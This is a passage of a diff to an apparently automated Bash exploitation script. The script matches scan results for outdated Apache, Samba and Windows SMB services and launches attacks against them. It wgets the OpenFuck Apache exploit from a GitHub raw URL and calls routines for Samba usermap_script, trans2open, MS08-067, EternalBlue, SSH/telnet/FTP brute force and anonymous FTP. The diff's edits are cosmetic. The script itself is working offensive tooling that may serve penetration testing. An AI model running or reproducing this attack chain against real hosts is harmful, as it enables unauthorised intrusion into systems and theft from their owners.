 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1451,10 +1455,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.12" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.12" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.12" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.12" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1489,10 +1493,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.20" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.20" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.20" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.20" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1515,10 +1519,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.22" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.22" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.22" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.22" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1549,10 +1553,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.23" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.23" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.23" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.23" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1581,10 +1585,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.9" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.9" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.9" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.9" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
 						wget -q -P ${dir_path}/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
@@ -1607,10 +1611,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.19" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.19" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.19" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.19" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
  
@@ -1634,10 +1638,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.24" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.24" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.24" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.24" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
  
@@ -1661,10 +1665,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/2.0.40" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "2.0.40" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/2.0.40" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "2.0.40" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
  
@@ -1686,10 +1690,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.26" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.26" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.26" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.26" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
  
@@ -1721,10 +1725,10 @@ do
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						body
 					fi
-				elif [ "$name" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/$operatinS" = "Apache/1.3.27" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "$version" = "1.3.27" ]
+				elif [ "${name}" = "http" ] && [ "${product}" = "Apache httpd" ] && [ "Apache/${operatinS}" = "Apache/1.3.27" ] && [ "${product}Openfk" = "Red-Hat/Linux" ] && [ "${version}" = "1.3.27" ]
 				then
-					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} $version${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
-					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} $version${resetStyle} is in progress"
+					echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${product} ${version}${resetStyle} which is ${BOLD}vulnerable${resetStyle} to ${RED}OpenF%&k ${resetStyle}"
+					echo -e "${RED}Exploiting ${resetStyle}${BOLD}${product} ${version}${resetStyle} is in progress"
 					if [ ! -f ${dir_path}/exploits/apache/OpenFuck ]
 					then
  
@@ -1760,51 +1764,53 @@ do
 					fi
 				fi
 #################   smb Linux      ####################################################################
-				if [ "$ostype" = "Linux" ] || [ "$ostype" = "linux" ]
+				if [ "${ostype}" = "Linux" ] || [ "${ostype}" = "linux" ]
 				then
-					if [ "$name" = "netbios-ssn" ] && [ "${product}" = "Samba smbd" ] && [ "$version" = "3.X - 4.X" ] && [ "${smbVersion}" = "Samba 3.0.20-Debian" ]
+					if [ "${name}" = "netbios-ssn" ] && [ "${product}" = "Samba smbd" ] && [ "${version}" = "3.X - 4.X" ] && [ "${smbVersion}" = "Samba 3.0.20-Debian" ]
 					then
 						usermap_script
 					fi
 				fi
 			done <${ips}/version.txt
-			if [ "$name" = "netbios-ssn" ] && [ "${product}" = "Samba smbd" ] && [ "${smbVersion}" = "Samba 2.2.1a" ]
+			if [ "${name}" = "netbios-ssn" ] && [ "${product}" = "Samba smbd" ] && [ "${smbVersion}" = "Samba 2.2.1a" ]
 			then
 				trans2open
 			fi
 ##################   smb Windows      ####################################################################
-			if [ "$ostype" = "Windows" ] || [ "$ostype" = "windows" ]
+			if [ "${ostype}" = "Windows" ] || [ "${ostype}" = "windows" ]
 			then
 				if [ "${name}" = "netbios-ssn" ] && [ "${product}" = "Microsoft Windows netbios-ssn" ]
 				then
 					while read smbvulnID
-					do
-						if [ "${smbvulnID}" = "ms08-067" ] || [ "${smbvulnID}" = "MS08-067" ]
-						then
-							ms08_067_netapi
-						elif [ "${smbvulnID}" = "ms17-010" ] || [ "${smbvulnID}" = "MS17-010" ]
-						then
-							ms17_010_eternalblues
-						fi
-				    done <${ips}/nmapSMBVuln.txt
+                    do
+                        if [ "${smbvulnID}" = "ms08-067" ] || [ "${smbvulnID}" = "MS08-067" ]
+                        then
+                            ms08_067_netapi
+                        elif [ "${smbvulnID}" = "ms17-010" ] || [ "${smbvulnID}" = "MS17-010" ]
+                        then
+                            ms17_010_eternalblue
+                        fi
+                    done < ${ips}/nmapSMBVuln.txt
 				fi
 			fi
         done <${ips}/product.txt
-		if [ "$name" = "rpcbind" ]
+		if [ "${name}" = "rpcbind" ]
 		then
 			smbclient
-		elif [ "$name" = "ssh" ]
+		elif [ "${name}" = "ssh" ]
 		then
 			sshBruteForce
-		elif [ "$name" = "telnet" ]
+		elif [ "${name}" = "telnet" ]
 		then
 			telnetBruteForce
-		elif [ "$name" = "ftp" ] && [ allowed="$(cat ${ips}/${ips}.xml | grep -oP 'Anonymous FTP login \K[^ ]+')" = "allowed" ]
-		then
-			ftpAnonymous
-		elif [ "$name" = "ftp" ]
+		elif [ "${name}" = "ftp" ]
 		then
 			ftpBruteForce
+            allowed="$(cat ${ips}/${ips}.xml | grep -oP 'Anonymous FTP login \K[^ ]+')"
+            if [ "${allowed}" = "allowed" ]
+            then
+                ftpAnonymous
+            fi
 		fi
     done <${ips}/name.txt
 	echo "########################################"
